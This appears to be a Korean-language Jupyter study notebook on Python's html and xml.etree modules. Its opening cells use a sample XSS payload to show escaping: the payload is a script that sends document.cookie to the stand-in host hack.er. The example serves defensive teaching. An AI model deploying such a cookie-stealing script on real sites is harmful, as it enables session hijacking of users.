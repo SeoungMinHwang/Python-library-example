{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f32152bd",
   "metadata": {},
   "source": [
    "# XSS공격을 막으려면?\n",
    "## html\n",
    "### HTML문자를 이스케이프(escape)처리할 때 사용하는 모듈"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e9ed7375",
   "metadata": {},
   "source": [
    "XXS 공격이란?  \n",
    "\n",
    "XSS 공격은 웹 응용프로그램에 존재하는 취약점을 기반으로 웹 서버와 클라이언트 간 통신 방식인 HTTP 프로토콜 동작과정 중에 발생합니다. XSS 공격은 웹사이트 관리자가 아닌 이가 웹페이지에 악성 스크립트를 삽입할 수 있는 취약점입니다. 주로 여러 사용자가 보는 게시판에 악성 스크립트가 담긴 글을 올리는 형태로 이루어집니다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "7d5f9c08",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "&lt;script&gt;location.href=&quot;http://hack.er/Cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;\n"
     ]
    }
   ],
   "source": [
    "import html\n",
    "\n",
    "src = '<script>location.href=\"http://hack.er/Cookie.php?cookie=\"+document.cookie</script>'\n",
    "result = html.escape(src)\n",
    "\n",
    "# 이처럼 이스케이프된 문자열은 브라우저에서는 입력한 그대로 보이지만 HTML 본연의 태그나 스크립트 기능은 사라진 상태\n",
    "print(result)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "cc0d18cd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<script>location.href=\"http://hack.er/Cookie.php?cookie=\"+document.cookie</script>'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#  이스케이프된 문자열을 원래의 HTML로 되돌릴 때는 html.unescap() 함수를 사용\n",
    "html.unescape(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3001f3a8",
   "metadata": {},
   "source": [
    "# 웹 페이지에서 원하는 텍스트만 뽑으려면?\n",
    "## html.parser\n",
    "### HTML 문서를 파싱할 때 사용하는 모듈"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d662725a",
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"\\n<html>\\n<head>\\n<title>Python Zen</title>\\n</head>\\n<body>\\n<h2>The Zen of Python, by Tim Peters</h2>\\n<ul>\\n  <li>Beautiful is better than ugly.</li>\\n  <li>Explicit is better than implicit.</li>\\n  <li>Simple is better than complex.</li>\\n  <li>Complex is better than complicated.</li>\\n  <li>Flat is better than nested.</li>\\n  <li>Sparse is better than dense.</li>\\n  <li>Readability counts.</li>\\n  <li>Special cases aren't special enough to break the rules.</li>\\n  <li>Although <strong>practicality</strong> beats purity.</li>\\n  <li>Errors should <strong>never</strong> pass silently.</li>\\n  <li>Unless explicitly silenced.</li>\\n  <li>In the face of ambiguity, refuse the temptation to guess.</li>\\n  <li>There should be one-- and preferably only one --obvious way to do it.</li>\\n  <li>Although that way may not be obvious at first unless you're Dutch.</li>\\n  <li><strong>Now</strong> is better than never.</li>\\n  <li>Although never is often better than <strong>right</strong> now.</li>\\n  <li>If the implementation is hard to explain, it's a bad idea.</li>\\n  <li>If the implementation is easy to explain, it may be a good idea.</li>\\n  <li>Namespaces are one honking great idea -- let's do more of those!</li>\\n</ul>\\n</body>\\n</html>\\n\""
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "<html>\n",
    "<head>\n",
    "<title>Python Zen</title>\n",
    "</head>\n",
    "<body>\n",
    "<h2>The Zen of Python, by Tim Peters</h2>\n",
    "<ul>\n",
    "  <li>Beautiful is better than ugly.</li>\n",
    "  <li>Explicit is better than implicit.</li>\n",
    "  <li>Simple is better than complex.</li>\n",
    "  <li>Complex is better than complicated.</li>\n",
    "  <li>Flat is better than nested.</li>\n",
    "  <li>Sparse is better than dense.</li>\n",
    "  <li>Readability counts.</li>\n",
    "  <li>Special cases aren't special enough to break the rules.</li>\n",
    "  <li>Although <strong>practicality</strong> beats purity.</li>\n",
    "  <li>Errors should <strong>never</strong> pass silently.</li>\n",
    "  <li>Unless explicitly silenced.</li>\n",
    "  <li>In the face of ambiguity, refuse the temptation to guess.</li>\n",
    "  <li>There should be one-- and preferably only one --obvious way to do it.</li>\n",
    "  <li>Although that way may not be obvious at first unless you're Dutch.</li>\n",
    "  <li><strong>Now</strong> is better than never.</li>\n",
    "  <li>Although never is often better than <strong>right</strong> now.</li>\n",
    "  <li>If the implementation is hard to explain, it's a bad idea.</li>\n",
    "  <li>If the implementation is easy to explain, it may be a good idea.</li>\n",
    "  <li>Namespaces are one honking great idea -- let's do more of those!</li>\n",
    "</ul>\n",
    "</body>\n",
    "</html>\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "1df4a8bb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "practicality\n",
      "never\n",
      "Now\n",
      "right\n"
     ]
    }
   ],
   "source": [
    "#위 HTML 파일에서 내용을 굵은 글씨로 표시하는 <strong> 태그와 </strong> 태그 사이의 문자열을 모두 찾아서 출력하는 프로그램을 만들려면?\n",
    "\n",
    "from html.parser import HTMLParser\n",
    "\n",
    "\n",
    "class MyHTMLParser(HTMLParser):\n",
    "    def __init__(self):\n",
    "        HTMLParser.__init__(self)\n",
    "        self.is_strong = False\n",
    "\n",
    "    def handle_starttag(self, tag, attrs):\n",
    "        if tag == 'strong':  # <strong> 태그 시작\n",
    "            self.is_strong = True\n",
    "\n",
    "    def handle_endtag(self, tag):\n",
    "        if tag == 'strong':  # </strong> 태그 닫힘\n",
    "            self.is_strong = False\n",
    "\n",
    "    def handle_data(self, data):\n",
    "        if self.is_strong:  # <strong>~</strong> 구간인 경우\n",
    "            print(data)     # 데이터를 출력\n",
    "\n",
    "\n",
    "with open('015HTML.html') as f:\n",
    "    parser = MyHTMLParser()\n",
    "    parser.feed(f.read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a91bcf2",
   "metadata": {},
   "source": [
    "# XML 문서를 만드려면?\n",
    "## xml.etree.ElementTree\n",
    "### XML문서를 만들 때 사용하는 모듈"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "075f01d0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\n<note date=\"20120104\">\\n    <to>Tove</to>\\n    <from>Jani</from>\\n    <heading>Reminder</heading>\\n    <body>Don\\'t forget me this weekend!</body>\\n</note>\\n'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#xml.etree.ElementTree 모듈을 사용하여 다음과 같은 note.xml 파일을 만들려면\n",
    "'''\n",
    "<note date=\"20120104\">\n",
    "    <to>Tove</to>\n",
    "    <from>Jani</from>\n",
    "    <heading>Reminder</heading>\n",
    "    <body>Don't forget me this weekend!</body>\n",
    "</note>\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "ce19c41e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<note><to>Tove</to></note>\n"
     ]
    }
   ],
   "source": [
    "\n",
    "from xml.etree.ElementTree import Element, dump\n",
    "\n",
    "note = Element(\"note\")\n",
    "to = Element(\"to\")\n",
    "to.text = \"Tove\"\n",
    "\n",
    "note.append(to)\n",
    "dump(note)  # note 엘리먼트를 XML로 출력"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "c87231e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<note><to>Tove</to><from>Jani</from></note>\n"
     ]
    }
   ],
   "source": [
    "#서브엘리먼트(SubElement)를 이용하면 더 편리하게 태그를 추가할 수 있다.\n",
    "from xml.etree.ElementTree import Element, SubElement, dump\n",
    "\n",
    "note = Element(\"note\")\n",
    "to = Element(\"to\")\n",
    "to.text = \"Tove\"\n",
    "\n",
    "note.append(to)\n",
    "SubElement(note, \"from\").text = \"Jani\"  # 이 부분 추가!\n",
    "\n",
    "dump(note)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "ce4b82c8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<note date=\"20120104\"><to>Tove</to><from>Jani</from></note>\n"
     ]
    }
   ],
   "source": [
    "#속성 추가\n",
    "from xml.etree.ElementTree import Element, SubElement, dump\n",
    "\n",
    "note = Element(\"note\")\n",
    "to = Element(\"to\")\n",
    "to.text = \"Tove\"\n",
    "\n",
    "note.append(to)\n",
    "SubElement(note, \"from\").text = \"Jani\"\n",
    "note.attrib[\"date\"] = \"20120104\"  # 이 부분 추가!\n",
    "\n",
    "dump(note)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "2fd312e2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<note date=\"20120104\"><to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Don't forget me this weekend!</body></note>\n"
     ]
    }
   ],
   "source": [
    "#위 note.xml 파일 작성 코드\n",
    "\n",
    "from xml.etree.ElementTree import Element, SubElement, dump\n",
    "\n",
    "note = Element(\"note\")\n",
    "note.attrib[\"date\"] = \"20120104\"\n",
    "\n",
    "to = Element(\"to\")\n",
    "to.text = \"Tove\"\n",
    "note.append(to)\n",
    "\n",
    "SubElement(note, \"from\").text = \"Jani\"\n",
    "SubElement(note, \"heading\").text = \"Reminder\"\n",
    "SubElement(note, \"body\").text = \"Don't forget me this weekend!\"\n",
    "dump(note)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "2d72d4bf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?xml version=\"1.0\" ?>\n",
      "<note date=\"20120104\">\n",
      "  <to>Tove</to>\n",
      "  <from>Jani</from>\n",
      "  <heading>Reminder</heading>\n",
      "  <body>Don't forget me this weekend!</body>\n",
      "</note>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from xml.etree.ElementTree import Element, SubElement\n",
    "\n",
    "note = Element(\"note\")\n",
    "note.attrib[\"date\"] = \"20120104\"\n",
    "\n",
    "to = Element(\"to\")\n",
    "to.text = \"Tove\"\n",
    "note.append(to)\n",
    "\n",
    "SubElement(note, \"from\").text = \"Jani\"\n",
    "SubElement(note, \"heading\").text = \"Reminder\"\n",
    "SubElement(note, \"body\").text = \"Don't forget me this weekend!\"\n",
    "\n",
    "# XML 을 보기좋게 만들어 저장\n",
    "from xml.dom import minidom\n",
    "import xml.etree.ElementTree as ET\n",
    "xmlstr = minidom.parseString(ET.tostring(note)).toprettyxml(indent=\"  \")\n",
    "print(xmlstr)\n",
    "\n",
    "# XML을 파일로 저장\n",
    "with open('015note.xml', 'w') as f:\n",
    "    f.write(xmlstr)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb055e01",
   "metadata": {},
   "source": [
    "#  XML에서 엘리먼트와 콘텐츠를 읽으려면?\n",
    "## xml.etree.ElementTree\n",
    "### XML문서를 파싱하고 검색할 때 사용하는 모듈"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "5825d269",
   "metadata": {},
   "outputs": [],
   "source": [
    "from xml.etree.ElementTree import parse\n",
    "\n",
    "tree = parse(\"015note.xml\")\n",
    "note = tree.getroot()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "2422e470",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "20120104\n",
      "['date']\n",
      "[('date', '20120104')]\n"
     ]
    }
   ],
   "source": [
    "#속성값 읽기 \n",
    "print(note.get(\"date\", \"19991231\"))\n",
    "print(note.keys())\n",
    "print(note.items())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "2d675000",
   "metadata": {},
   "outputs": [],
   "source": [
    "#하위 엘리멘트 접근\n",
    "from_tag = note.find(\"from\")\n",
    "from_tags = note.findall(\"from\")\n",
    "from_text = note.findtext(\"from\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "4ffd1ef0",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "20120104\n",
      "Tove\n",
      "Jani\n",
      "Reminder\n",
      "Don't forget me this weekend!\n"
     ]
    }
   ],
   "source": [
    "#특정 태그의 모든 하위 엘리먼트를 순서대로 처리할 때는 다음처럼 iter() 함수를 사용\n",
    "\n",
    "#from_childs = note.iter(\"from\")\n",
    "\n",
    "from xml.etree.ElementTree import parse\n",
    "\n",
    "tree = parse(\"015note.xml\")\n",
    "note = tree.getroot()\n",
    "\n",
    "print(note.get(\"date\"))\n",
    "for parent in tree.iter():\n",
    "    for child in parent:\n",
    "        print(child.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37830e05",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
